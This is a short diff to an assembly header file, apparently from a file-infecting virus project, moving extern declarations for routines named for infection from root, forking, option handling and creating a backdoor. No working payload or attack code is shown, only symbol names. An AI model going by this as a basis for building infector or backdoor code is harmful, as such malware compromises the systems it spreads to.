@@ -92,8 +92,7 @@
 		extern _start_infect
 		extern _infect_from_root
 		extern _verify_starting_infect
-		extern _famine_start_options
-	    extern _fork_before_exec_normaly
+		extern _exit_properly
 	%endif
 
 	%ifndef TREAT_FILE_S
@@ -107,6 +106,8 @@
 
 	%ifndef FORK_S
 		extern _thread_create
+		extern _fork_before_exec_normaly
+		extern _fork_before_infect_root
 	%endif
 
 	%ifndef DEPACKER_S
@@ -172,5 +173,9 @@
 
 	%ifndef CREATE_BACKDOOR_S
 		extern _create_backdoor
+	%endif
+
+	%ifndef FAMINE_OPTIONS_S
+		extern _famine_start_options
 	%endif
 %endif
